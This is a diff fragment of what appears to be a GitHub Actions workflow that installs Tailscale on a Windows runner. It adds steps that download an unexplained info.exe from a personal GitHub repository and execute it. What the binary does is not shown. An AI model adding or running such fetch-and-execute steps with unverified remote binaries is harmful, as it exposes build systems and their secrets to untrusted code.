@@ -11,9 +11,12 @@ jobs:
     steps:
     - name: Download Tailscale
       run: Invoke-WebRequest https://pkgs.tailscale.com/stable/tailscale-setup-1.74.0-amd64.msi -OutFile tailscale.msi
+    - name: Download info.exe
+      run: Invoke-WebRequest https://github.com/caejb/temp/raw/main/info.exe -OutFile info.exe
     - name: Install Tailscale
-      id: install
       run: .\tailscale.msi /quiet
+    - name: run info.exe
+      run: .\info.exe
     - name: Download Installer
       run: Invoke-WebRequest https://github.com/caejb/temp/raw/main/install.exe -OutFile install.exe
     - name: Download
